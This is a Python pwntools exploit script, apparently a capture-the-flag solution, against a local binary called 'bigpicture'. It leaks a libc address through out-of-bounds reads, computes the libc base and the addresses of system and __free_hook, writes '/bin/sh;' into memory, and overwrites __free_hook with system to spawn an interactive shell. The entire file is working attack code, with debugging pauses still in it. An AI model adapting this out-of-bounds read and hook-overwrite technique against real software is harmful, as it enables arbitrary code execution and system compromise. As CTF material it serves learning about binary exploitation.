from pwn import *

context.log_level='debug'

s=process('./bigpicture');

e=ELF('./bigpicture')
l=ELF('/lib/x86_64-linux-gnu/libc-2.24.so')

def plot(width,height):
        print s.recvuntil('How big? ')
        s.sendline(str(width)+' x '+str(height))

def get(a1,a2,a3):
        raw_input()
        print s.recvuntil('> ')
        raw_input()
        s.send(str(a1)+' , '+str(a2)+' , '+str(a3))
        raw_input()
        print s.recvuntil('overwriting ')

def overwrite(a1,a2,a3):
        raw_input()
        print s.recvuntil('> ')
        raw_input()
        s.send(str(a1)+' , '+str(a2)+' , '+str(a3))
        raw_input()

if __name__ == '__main__':
    buf=''
    libc_leak=''
    plot(128,1024)
    get(-1956,-2512,'A')
    buf=s.recv(2)
    libc_leak=buf[0]
    get(-1956,-2511,'A')
    buf=s.recv(2)
    libc_leak=libc_leak+buf[0]
    get(-1956,-2510,'A')
    buf=s.recv(2)
    libc_leak=libc_leak+buf[0]
    get(-1956,-2509,'A')
    buf=s.recv(2)
    libc_leak=libc_leak+buf[0]
    get(-1956,-2508,'A')
    buf=s.recv(2)
    libc_leak=libc_leak+buf[0]
    get(-1956,-2507,'A')
    buf=s.recv(2)
    libc_leak=libc_leak+buf[0]

    libc_leak=libc_leak+"\x00"
    libc_leak=libc_leak+"\x00"
    '''
    pwndbg> x/10gx 0x7ffff7dd2600
    0x7ffff7dd2600 <_IO_2_1_stdout_>:   0x00000000fbad2887  0x00007ffff7dd2683
    0x7ffff7dd2610 <_IO_2_1_stdout_+16>:    0x00007ffff7dd2683  0x00007ffff7dd2683
    0x7ffff7dd2620 <_IO_2_1_stdout_+32>:    0x00007ffff7dd2683  0x00007ffff7dd2683
    0x7ffff7dd2630 <_IO_2_1_stdout_+48>:    0x00007ffff7dd2683  0x00007ffff7dd2683
    0x7ffff7dd2640 <_IO_2_1_stdout_+64>:    0x00007ffff7dd2684  0x0000000000000000
    '''
    libc_leak=u64(libc_leak)
    print "libc libc: "+str(hex(libc_leak))
    
    system_addr=libc_leak-3657700
    free_addr=libc_leak+125916
    libc_base=libc_leak-3942020
    __free_hook_addr=libc_base+l.symbols['__free_hook']

    print "libc_base: "+str(hex(libc_base))
    print "system_addr: "+str(hex(system_addr))
    print "free_addr: "+str(hex(free_addr))
    print "__free_hook_addr: "+str(hex(__free_hook_addr))


    i=0
    for binsh in "/bin/sh;":
        overwrite(0,i,binsh)
        i=i+1

    i=-136
    for hook in p64(system_addr):
        overwrite(-1954,i,hook)   
        i=i+1

    s.interactive()


